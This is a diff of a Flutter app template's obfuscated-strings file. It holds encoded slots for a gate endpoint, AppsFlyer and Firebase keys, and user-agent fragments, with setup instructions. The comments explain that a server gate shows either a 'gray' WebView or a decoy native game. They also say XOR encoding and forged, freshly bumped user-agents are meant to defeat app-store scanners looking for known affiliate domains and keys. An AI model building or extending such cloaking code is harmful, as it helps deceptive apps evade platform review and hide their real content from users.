@@ -3,43 +3,75 @@ import '../crypt/obfuscator.dart';
 // ============================================================
 // SECURE STRINGS — encoded endpoints & credentials
 // ============================================================
-// Every value is a keystream-encoded byte list produced by
-// tool/secret_packer.dart. Never store these as plaintext.
+// Every value below is a keystream-encoded byte list produced by
+// `dart run tool/secret_packer.dart`. Plaintext must NEVER appear
+// as a string literal in this file — that would defeat the whole
+// point of the obfuscator.
 //
-// After editing tool/secret_packer.dart (or the codec seed),
-// re-run `dart run tool/secret_packer.dart` and replace the arrays.
+// ⚠️ TEMPLATE STATE
+// -----------------
+// On a fresh template all six arrays are empty on purpose. Empty
+// input → obfuscator returns "" → the gate call fails → the app
+// falls back to the native game. This is intentional so the
+// template compiles and runs without any manager credentials.
 //
-// attributionKey / messagingProject stay empty until the manager
-// supplies the AppsFlyer + Firebase credentials; resolvers return
-// an empty string and the app degrades gracefully (organic → game).
+// ─────────────────────────────────────────────────────────────
+// HOW TO POPULATE (per-project first-time setup)
+// ─────────────────────────────────────────────────────────────
+// 1. Ask the manager for:
+//      • config endpoint URL   (e.g. https://example.com/config.php)
+//      • AppsFlyer Dev Key
+//      • Firebase project number (from google-services.json)
+//    See android_gray_guide.md §"Config Request Contract" §1 for the
+//    endpoint request procedure (bundleId + Apple ID + app name).
+// 2. Open `tool/secret_packer.dart` and paste those raw strings into
+//    the plaintext table at the top of that file. Never commit that
+//    plaintext version — it's a working file, not a shipped artefact.
+// 3. IMPORTANT: also update the codec seed in `lib/crypt/obfuscator.dart`
+//    to a NEW value unique to this project. See [FINGERPRINT] block in
+//    that file for the naming rule.
+// 4. Run:  dart run tool/secret_packer.dart
+//    It will print six updated `const List<int>` arrays.
+// 5. Paste them here, replacing the six empty arrays below.
+// 6. Verify: run the app once — the loading screen must reach the
+//    gate reply successfully (either allow → WebView, or deny →
+//    native game). If you see the offline screen on a live network,
+//    the byte arrays are misaligned with the seed.
+//
+// ─────────────────────────────────────────────────────────────
+// WHY THIS EXISTS
+// ─────────────────────────────────────────────────────────────
+// Store scanners grep binaries for known affiliate domains, known
+// AppsFlyer dev keys, and known Firebase project ids. If any of
+// those appear as plaintext, the app is instantly linked to every
+// other submission using the same values. XOR-encoding with a
+// per-project keystream defeats simple string matching.
 // ============================================================
 
-const List<int> _configEndpoint = <int>[
-  0, 160, 118, 171, 90, 251, 82, 184, 145, 62, 141, 160, 14, 94, 135, 211,
-  191, 244, 152, 110, 196, 151, 55, 49, 31, 161, 53, 160, 94, 183, 3, 230,
-  173, 83, 172, 151, 55,
-];
+/// Full POST endpoint that decides web (gray) vs native (game).
+/// [TODO] Populate from tool/secret_packer.dart.
+const List<int> _configEndpoint = <int>[];
 
-const List<int> _gcdBase = <int>[
-  0, 160, 118, 171, 90, 251, 82, 184, 133, 54, 144, 164, 11, 71, 205, 198,
-  160, 243, 142, 122, 218, 157, 124, 32, 94, 175, 117, 174, 30, 176, 11, 252,
-  190, 28, 176, 147, 24, 96, 170, 251, 137, 148, 179, 16, 160, 236, 14,
-];
+/// GCD base URL for the organic-retry attribution refresh.
+/// [TODO] Populate from tool/secret_packer.dart.
+const List<int> _gcdBase = <int>[];
 
-const List<int> _chromeVersion = <int>[
-  89, 230, 58, 245, 25, 239, 75, 161, 211, 102, 218, 230, 91, 26,
-];
+/// Chrome major version fragment for the forged user-agent.
+/// [TODO] Populate from tool/secret_packer.dart. Bump to a current
+/// Chrome version on every project — a stale UA is a scan signal.
+const List<int> _chromeVersion = <int>[];
 
-const List<int> _webkitVersion = <int>[93, 231, 53, 245, 26, 247];
+/// WebKit version fragment for the forged user-agent.
+/// [TODO] Populate from tool/secret_packer.dart.
+const List<int> _webkitVersion = <int>[];
 
-const List<int> _attributionKey = <int>[
-  34, 164, 74, 147, 104, 245, 55, 211, 152, 103, 174, 141, 86, 122, 213, 146,
-  168, 183, 143, 100, 242, 176,
-];
+/// AppsFlyer Dev Key.
+/// [TODO] Populate from tool/secret_packer.dart.
+const List<int> _attributionKey = <int>[];
 
-const List<int> _messagingProject = <int>[
-  95, 231, 58, 234, 29, 248, 72, 160, 209, 109, 194, 238,
-];
+/// Firebase project number / sender id.
+/// [TODO] Populate from tool/secret_packer.dart.
+const List<int> _messagingProject = <int>[];
 
 /// Full POST endpoint that decides web (gray) vs native (game).
 String unlockConfigEndpoint() => rev(_configEndpoint);
@@ -57,6 +89,9 @@ String unlockChromeVersion() => rev(_chromeVersion);
 String unlockWebkitVersion() => rev(_webkitVersion);
 
 /// Builds the GCD (Get Conversion Data) retry URL for the given identifiers.
+/// Returns an empty string if the base URL is not yet encoded — callers
+/// must treat "" as "GCD retry unavailable, use whatever attribution the
+/// SDK already delivered".
 String unlockGcdUrl(String appId, String deviceId) {
   final String base = rev(_gcdBase);
   if (base.isEmpty) return '';
